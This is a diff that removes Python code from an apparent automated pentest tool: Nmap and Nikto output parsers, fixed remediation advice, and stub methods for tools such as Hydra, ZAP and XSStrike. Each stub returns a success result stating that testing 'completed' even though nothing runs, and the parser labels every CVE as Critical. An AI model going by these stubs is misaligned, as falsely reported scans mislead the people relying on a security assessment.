-                        vulnerabilities.append({
-                            'type': 'Script-Detected Vulnerability',
-                            'severity': 'High',
-                            'tool': 'Nmap',
-                            'evidence': line,
-                            'vulnerability_name': vuln_name,
-                            'port': current_port,
-                            'service': current_service,
-                            'vulnerability_type': 'script_detected',
-                            'recommendation': f'Investigate and fix {vuln_name} vulnerability'
-                        })
-        
-        return vulnerabilities
-    
-    def _parse_nikto_output(self, output: str) -> List[Dict]:
-        """
-        Enhanced Nikto output parsing with detailed web server vulnerability information
-        """
-        vulnerabilities = []
-        lines = output.split('\n')
-        
-        # Enhanced patterns for web server vulnerability detection
-        nikto_patterns = {
-            'vulnerability_line': r'^\+\s*(.+?)$',
-            'osvdb_reference': r'OSVDB-(\d+)',
-            'cve_reference': r'CVE-(\d{4}-\d{4,7})',
-            'severity_indicators': {
-                'critical': ['sql injection', 'remote code execution', 'file inclusion'],
-                'high': ['xss', 'directory traversal', 'authentication bypass'],
-                'medium': ['information disclosure', 'default files', 'configuration'],
-                'low': ['banner', 'server info', 'outdated']
-            },
-            'category_patterns': {
-                'authentication': ['auth', 'login', 'password', 'credential'],
-                'configuration': ['config', 'default', 'setup', 'install'],
-                'disclosure': ['info', 'disclosure', 'banner', 'version'],
-                'injection': ['injection', 'sql', 'command', 'script'],
-                'traversal': ['traversal', 'directory', 'path', 'file']
-            }
-        }
-        
-        for line in lines:
-            line = line.strip()
-            
-            # Parse Nikto vulnerability lines (starting with +)
-            vuln_match = re.search(nikto_patterns['vulnerability_line'], line)
-            if vuln_match:
-                vuln_description = vuln_match.group(1)
-                
-                # Determine severity based on content
-                severity = 'Low'  # Default
-                category = 'miscellaneous'
-                
-                vuln_lower = vuln_description.lower()
-                
-                # Check severity indicators
-                for sev_level, indicators in nikto_patterns['severity_indicators'].items():
-                    if any(indicator in vuln_lower for indicator in indicators):
-                        severity = sev_level.capitalize()
-                        break
-                
-                # Determine category
-                for cat, indicators in nikto_patterns['category_patterns'].items():
-                    if any(indicator in vuln_lower for indicator in indicators):
-                        category = cat
-                        break
-                
-                vulnerability = {
-                    'type': 'Web Server Vulnerability',
-                    'severity': severity,
-                    'tool': 'Nikto',
-                    'evidence': vuln_description,
-                    'category': category,
-                    'vulnerability_type': 'web_server',
-                    'recommendation': f'Review and fix {category} issue'
-                }
-                
-                # Extract OSVDB reference
-                osvdb_match = re.search(nikto_patterns['osvdb_reference'], vuln_description)
-                if osvdb_match:
-                    vulnerability['osvdb_id'] = f"OSVDB-{osvdb_match.group(1)}"
-                
-                # Extract CVE reference
-                cve_match = re.search(nikto_patterns['cve_reference'], vuln_description)
-                if cve_match:
-                    vulnerability['cve_id'] = f"CVE-{cve_match.group(1)}"
-                    vulnerability['severity'] = 'Critical'  # CVEs are typically critical
-                
-                # Add specific recommendations based on category
-                recommendations = {
-                    'authentication': 'Implement strong authentication mechanisms',
-                    'configuration': 'Review and secure server configuration',
-                    'disclosure': 'Minimize information disclosure in responses',
-                    'injection': 'Implement input validation and sanitization',
-                    'traversal': 'Restrict file system access and validate paths'
-                }
-                
-                if category in recommendations:
-                    vulnerability['recommendation'] = recommendations[category]
-                
-                vulnerabilities.append(vulnerability)
-        
-        return vulnerabilities
-    
-    # ===== RECOMMENDATION METHODS =====
-    def _get_sql_injection_recommendations(self, vulnerabilities: List[Dict]) -> List[str]:
-        """Get recommendations for SQL injection vulnerabilities"""
-        if not vulnerabilities:
-            return ["No SQL injection vulnerabilities found"]
-        
-        return [
-            "Implement parameterized queries/prepared statements",
-            "Use input validation and sanitization",
-            "Apply principle of least privilege to database accounts",
-            "Enable SQL query logging and monitoring",
-            "Consider using stored procedures with proper input validation"
-        ]
-    
-    def _get_xss_recommendations(self, vulnerabilities: List[Dict]) -> List[str]:
-        """Get recommendations for XSS vulnerabilities"""
-        if not vulnerabilities:
-            return ["No XSS vulnerabilities found"]
-        
-        return [
-            "Implement proper output encoding/escaping",
-            "Use Content Security Policy (CSP) headers",
-            "Validate and sanitize all user input",
-            "Use HTTPOnly and Secure flags on cookies",
-            "Implement input validation on both client and server side"
-        ]
-    
-    def _get_api_recommendations(self, vulnerabilities: List[Dict]) -> List[str]:
-        """Get recommendations for API security issues"""
-        return [
-            "Implement proper authorization checks for all API endpoints",
-            "Use object-level authorization to prevent IDOR attacks",
-            "Implement rate limiting and request throttling",
-            "Use API versioning and deprecate old versions",
-            "Implement comprehensive API logging and monitoring"
-        ]
-    
-    def _get_auth_recommendations(self, vulnerabilities: List[Dict]) -> List[str]:
-        """Get recommendations for authentication issues"""
-        return [
-            "Implement strong password policies",
-            "Use multi-factor authentication (MFA)",
-            "Implement account lockout mechanisms",
-            "Use secure session management",
-            "Implement proper session timeout and invalidation"
-        ]
-    
-    def _get_network_recommendations(self, vulnerabilities: List[Dict]) -> List[str]:
-        """Get recommendations for network security issues"""
-        return [
-            "Close unnecessary open ports",
-            "Update services to latest versions",
-            "Implement network segmentation",
-            "Use intrusion detection/prevention systems",
-            "Regular security updates and patch management"
-        ]
-    
-    # ===== PLACEHOLDER METHODS FOR ADDITIONAL TOOLS =====
-    async def _run_gobuster(self, url: str) -> ToolResult:
-        """Run Gobuster directory enumeration"""
-        # Implementation would go here
-        return ToolResult(True, "Gobuster", "gobuster", "Directory enumeration completed")
-    
-    async def _run_ffuf_directory(self, url: str) -> ToolResult:
-        """Run FFUF directory enumeration"""
-        # Implementation would go here
-        return ToolResult(True, "FFUF", "ffuf", "Directory fuzzing completed")
-    
-    async def _run_dirb(self, url: str) -> ToolResult:
-        """Run DIRB directory enumeration"""
-        # Implementation would go here
-        return ToolResult(True, "DIRB", "dirb", "Directory enumeration completed")
-    
-    async def _zap_sql_injection_scan(self, url: str) -> ToolResult:
-        """Run ZAP SQL injection scan"""
-        # Implementation would go here
-        return ToolResult(True, "ZAP SQL", "zap", "SQL injection scan completed")
-    
-    async def _zap_xss_scan(self, url: str) -> ToolResult:
-        """Run ZAP XSS scan"""
-        # Implementation would go here
-        return ToolResult(True, "ZAP XSS", "zap", "XSS scan completed")
-    
-    async def _run_zap_comprehensive_scan(self, url: str) -> ToolResult:
-        """Run comprehensive ZAP scan"""
-        # Implementation would go here
-        return ToolResult(True, "ZAP Comprehensive", "zap", "Comprehensive scan completed")
-    
-    # Additional placeholder methods for other testing functions...
-    async def _test_idor_vulnerabilities(self, url: str, plan: Dict[str, str]) -> ToolResult:
-        return ToolResult(True, "IDOR Test", "browser", "IDOR testing completed")
-    
-    async def _test_api_authorization(self, url: str, plan: Dict[str, str]) -> ToolResult:
-        return ToolResult(True, "API Auth Test", "curl", "API authorization testing completed")
-    
-    async def _test_authentication_bypass(self, url: str, plan: Dict[str, str]) -> ToolResult:
-        return ToolResult(True, "Auth Bypass Test", "browser", "Authentication bypass testing completed")
-    
-    async def _test_session_management(self, url: str, plan: Dict[str, str]) -> ToolResult:
-        return ToolResult(True, "Session Test", "browser", "Session management testing completed")
-    
-    async def _run_hydra_bruteforce(self, url: str, plan: Dict[str, str]) -> ToolResult:
-        return ToolResult(True, "Hydra", "hydra", "Brute force testing completed")
-    
-    async def _run_ffuf_api_enum(self, url: str) -> ToolResult:
-        return ToolResult(True, "FFUF API", "ffuf", "API enumeration completed")
-    
-    async def _detect_technologies(self, url: str) -> ToolResult:
-        return ToolResult(True, "Tech Detection", "browser", "Technology detection completed")
-    
-    async def _dns_enumeration(self, url: str) -> ToolResult:
-        return ToolResult(True, "DNS Enum", "dig", "DNS enumeration completed")
-    
-    async def _general_browser_testing(self, url: str, plan: Dict[str, str]) -> ToolResult:
-        return ToolResult(True, "General Browser Test", "browser", "General browser testing completed")
-    
-    async def _run_xsstrike(self, url: str, plan: Dict[str, str]) -> ToolResult:
-        return ToolResult(True, "XSStrike", "xsstrike", "XSS testing completed")
